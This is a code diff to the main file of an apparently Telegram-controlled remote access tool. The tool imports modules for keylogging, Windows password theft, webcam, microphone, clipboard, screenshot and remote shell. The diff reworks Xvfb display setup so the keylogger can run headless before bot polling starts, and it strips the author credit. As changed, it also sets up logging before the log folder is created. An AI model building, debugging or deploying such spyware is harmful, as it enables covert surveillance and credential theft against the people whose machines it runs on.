@@ -3,46 +3,76 @@ import logging
 import os
 import subprocess
 import time
-from aiogram import Dispatcher, types
-from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard, win_passwords, keylogger
-from cfg import bot as bot
+import socket
 
-# Author : Exited3n
-# https://t.me/wh_lab
-
-os.makedirs('logs', exist_ok=True)
-
-# Configure logging
+# Configure logging early
 logging.basicConfig(level=logging.INFO, filename='logs/bot.log',
                     format="%(filename)s:%(lineno)d #%(levelname)-8s" "[%(asctime)s] - %(name)s - %(message)s")
 
 
+def find_free_display(start=99, max_tries=10):
+    """Find an available display number for Xvfb."""
+    for i in range(start, start + max_tries):
+        display = f":{i}"
+        lock_file = f"/tmp/.X{i}-lock"
+        if not os.path.exists(lock_file):
+            # Additional check: try connecting to the display
+            try:
+                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                s.connect(f"/tmp/.X11-unix/X{i}")
+                s.close()
+                continue  # Display is in use
+            except (ConnectionRefusedError, FileNotFoundError):
+                return display
+    raise RuntimeError("No free display found")
+
+
 def setup_xvfb():
-    """Start Xvfb if no X server is running and set DISPLAY environment variable."""
-    display = ":99"  # Use display :99 for Xvfb
+    """Start Xvfb and set DISPLAY environment variable."""
     if os.environ.get('DISPLAY'):
         logging.info(f"DISPLAY already set to {os.environ['DISPLAY']}")
         return
 
     try:
-        # Check if Xvfb is already running
-        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
-        if 'Xvfb' in result.stdout:
-            logging.info("Xvfb is already running")
-            os.environ['DISPLAY'] = display
-            return
+        # Find a free display
+        display = find_free_display()
+        logging.info(f"Selected display {display} for Xvfb")
 
         # Start Xvfb
         logging.info(f"Starting Xvfb on display {display}")
-        subprocess.Popen(['Xvfb', display, '-screen', '0', '1024x768x16'], stdout=subprocess.PIPE,
-                         stderr=subprocess.PIPE)
-        time.sleep(1)  # Give Xvfb time to start
+        xvfb_process = subprocess.Popen(
+            ['Xvfb', display, '-screen', '0', '1024x768x16', '-ac'],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+        time.sleep(2)  # Wait for Xvfb to initialize
+
+        # Check if Xvfb is running
+        if xvfb_process.poll() is not None:
+            stderr = xvfb_process.stderr.read().decode()
+            raise RuntimeError(f"Xvfb failed to start: {stderr}")
+
         os.environ['DISPLAY'] = display
-        logging.info(f"Xvfb started and DISPLAY set to {display}")
+        logging.info(f"Xvfb started successfully on {display}")
     except Exception as e:
-        logging.error(f"Failed to start Xvfb: {e}")
+        logging.error(f"Failed to setup Xvfb: {e}")
         raise
 
+
+# Setup Xvfb before importing modules that use pynput
+logging.info("Setting up Xvfb")
+try:
+    setup_xvfb()
+except Exception as e:
+    logging.error(f"Xvfb setup failed: {e}")
+    print(f"Xvfb setup failed: {e}")
+    exit(1)
+
+# Import modules after setting DISPLAY
+from aiogram import Dispatcher, types
+from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard, win_passwords, keylogger
+from cfg import bot as bot
+
+os.makedirs('logs', exist_ok=True)
 
 dp = Dispatcher()
 
@@ -71,8 +101,6 @@ async def errors_handler(update: types.Update, exception: Exception):
 
 async def main():
     try:
-        logging.info("Setting up Xvfb")
-        setup_xvfb()
         logging.info("Starting keylogger setup")
         keylogger.setup_keylogger()
         logging.info("Starting bot polling")
